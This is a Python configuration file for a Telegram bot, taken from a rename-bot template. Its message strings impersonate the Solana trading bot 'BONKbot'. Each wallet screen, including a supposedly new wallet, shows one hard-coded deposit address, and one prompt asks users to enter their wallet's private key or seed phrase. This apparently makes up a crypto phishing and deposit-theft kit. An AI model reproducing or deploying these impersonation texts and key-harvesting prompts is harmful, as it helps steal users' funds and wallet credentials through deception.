"""
Apache License 2.0
Copyright (c) 2022 @PYRO_BOTZ
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
Telegram Link : https://t.me/PYRO_BOTZ 
Repo Link : https://github.com/TEAM-PYRO-BOTZ/PYRO-RENAME-BOT
License Link : https://github.com/TEAM-PYRO-BOTZ/PYRO-RENAME-BOT/blob/main/LICENSE
"""

import re, os, time

id_pattern = re.compile(r'^.\d+$') 

class Config(object):
    # pyro client config
    API_ID    = os.environ.get("API_ID", "")
    API_HASH  = os.environ.get("API_HASH", "")
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "") 
   
    # database config
    DB_NAME = os.environ.get("DB_NAME","pyro-botz")     
    DB_URL  = os.environ.get("DB_URL","")
 
    # other configs
    BOT_UPTIME  = time.time()
    START_PIC   = os.environ.get("START_PIC", "")
    ADMIN       = os.environ.get("API_ID", "")
    FORCE_SUB   = os.environ.get("FORCE_SUB", "") 
    LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", None))

    # wes response configuration     
    WEBHOOK = bool(os.environ.get("WEBHOOK", "True"))



class Txt(object):
    # part of text configuration
    START_TXT = """<b>Hi {} 
Welcome to BONKBot!

Solana’s fastest bot to trade any coin (SPL token), built by the BONK community!

You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:

`<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>` (tap to copy)

Once done, tap refresh and your balance will appear here.

To buy a token enter a ticker, token address, or a URL from pump.fun or Birdeye.

For more info on your wallet and to retrieve your private key, tap the wallet button below. User funds are safe on BONKbot, but if you expose your private key we can't protect you!</b>"""

    SETTINGS_TXT = """Settings:

GENERAL SETTINGS
Language: Shows the current language. Tap to switch between available languages.
Minimum Position Value: Minimum position value to show in portfolio. Will hide tokens below this threshhold. Tap to edit.

AUTO BUY
Immediately buy when pasting token address. Tap to toggle.

BUTTONS CONFIG
Customize your buy and sell buttons for buy token and manage position. Tap to edit.

SLIPPAGE CONFIG
Customize your slippage settings for buys and sells. Tap to edit.
Max Price Impact is to protect against trades in extremely illiquid pools.

MEV PROTECT
MEV Protect accelerates your transactions and protect against frontruns to make sure you get the best price possible.
Turbo: BONKbot will use MEV Protect, but if unprotected sending is faster it will use that instead.
Secure: Transactions are guaranteed to be protected. This is the ultra secure option, but may be slower.;

TRANSACTION PRIORITY
Increase your Transaction Priority to improve transaction speed. Select preset or tap to edit.

SELL PROTECTION;
100% sell commands require an additional confirmation step.  Tap to toggle."""

    DEPOSIT_TXT = """Deposit Solana or import wallet to update settings"""

    DEPOSITADDRESS_TXT = """“To start trading add funds to your sol wallet provided below ⬇️

<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>"""

    IMPORTWALLET_TXT = """What is the private key or seed phrase of the wallet that you want to import?

Phantom or Solflare wallet and any other trading bot private keys are accepted.

Please enter it below ⬇️"""

    NEWWALLET_TXT = """Your New Wallet has been Created Successfully 
Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
Balance: 0.000000000 SOL"""

    WALLETADDRESS = """Your Wallet:
  
Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
Balance: 0.000000000 SOL
  
Tap to copy the address and send SOL to deposit."""

    NOENOUGHBALANCE_TXT = """Not enough SOL to withdraw"""

    REFER_TXT = """Referrals:

Your reflink: https://t.me/bonkbot_bot?start=ref_kdp28

Referrals: 0

Lifetime Bonk earned: 0.00 BONK ($0.00)

Rewards are updated at least every 24 hours and rewards are automatically deposited to your BONK balance.

Refer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!"""

    BUYSOL_TXT = """Buy Token:
  
To buy a token enter a ticker, token address, or a URL from pump.fun or Birdeye."""

    SELL_TXT = """No open positions"""

    HELP_TXT = """Help:

Which tokens can I trade?
Any SPL token that is a SOL pair, on Raydium or Jupiter, and will integrate more platforms on a rolling basis. We pick up Raydium pairs instantly, and Jupiter will pick up non-SOL pairs within approx. 15 minutes.

How can I see how much money I've made from referrals?
Tap the referrals button or type /referrals to see your payment in $BONK!

How do I create a new wallet on BONKbot?
Tap the Wallet button or type /wallet, and you'll be able to configure your new wallets!

Is BONKbot free? How much do I pay for transactions?
BONKbot is completely free! We charge 1% on transactions, and keep the bot free so that anyone can use it. 

Why is my Net Profit lower than expected?
Your Net Profit is calculated after deducting all associated costs, including Price Impact, Transfer Tax, Dex Fees, and a 1% BONKbot fee. This ensures the figure you see is what you actually receive, accounting for all transaction-related expenses.

Is there a difference between @TheBonkBot and the backup bots?
No, they are all the same bot and you can use them interchangeably. If one is slow or down, you can use the other ones. You will have access to the same wallet and positions.
  
Further questions? Join our Telegram group: https://t.me/BONKbotChat"""



#⚠️ Dᴏɴ'ᴛ Rᴇᴍᴏᴠᴇ Oᴜʀ Cʀᴇᴅɪᴛꜱ @ᴩyʀᴏ_ʙᴏᴛᴢ🙏🥲
    DEV_TXT = """<b><u>Sᴩᴇᴄɪᴀʟ Tʜᴀɴᴋꜱ & Dᴇᴠᴇʟᴏᴩᴇʀꜱ</b></u>
» 𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗢𝗗𝗘 : <a href=https://www.youtube.com/watch?v=jUXGN-ffKlk>🖥️🖥️🖥️🖥️🖥️🖥️</a>
» 𝗛𝗢𝗪 𝗧𝗢 : <a href=https://youtu.be/5M0Zkz22UYc>🤷‍♂️IDK🤷‍♂️</a>
• ❣️ <a href=https://t.me/TGTesla>ㄒ乇丂ㄥ卂</a>
• ❣️ <a href=https://t.me/TalismanBro>₮₳₮Ɇ</a>
• ❣️ <a href=https://youtu.be/GfulqsSnTv4>Formula 1</a>
• ❣️ <a href=https://t.me/FDBotz>FDBotz</a>
• ❣️ <a href=https://t.me/ANAUTOFILTERBOT>AUTO FILTER BOT</a>
• ❣️ <a href=https://t.me/FDFileStoreBot>File Store Bot</a>"""



    PROGRESS_BAR = """<b>\n
╭━━━━❰ᴘʀᴏɢʀᴇss ʙᴀʀ❱━➣
┣⪼ 🗃️ Sɪᴢᴇ: {1} | {2}
┣⪼ ⏳️ Dᴏɴᴇ : {0}%
┣⪼ 🚀 Sᴩᴇᴇᴅ: {3}/s
┣⪼ ⏰️ Eᴛᴀ: {4}
╰━━━━━━━━━━━━━━━➣ </b>"""


